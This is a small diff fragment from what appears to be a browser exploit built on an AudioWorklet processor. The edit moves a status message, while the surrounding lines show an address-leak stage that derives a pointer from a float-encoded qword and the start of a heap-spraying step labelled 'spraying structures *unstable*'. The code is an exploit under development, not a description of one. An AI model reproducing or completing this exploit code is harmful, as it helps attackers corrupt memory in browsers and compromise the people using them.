@@ -610,7 +610,7 @@ b.process = (inputs, outputs, parameters)=>{
   //fuck.port.postMessage('Posting message back to main script');
   alert(workerResult);
 };*/
-    fuck.port.postMessage("starting");
+    
     
         if(stage== "leak") {
         var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
@@ -622,7 +622,7 @@ b.process = (inputs, outputs, parameters)=>{
         //sleep(4000);
         }
         
-    
+        fuck.port.postMessage("starting");
         fuck.port.postMessage("spraying structures *unstable*");
         var gcPreventer = [];
         for (let i = 0; i < 2; i++) {
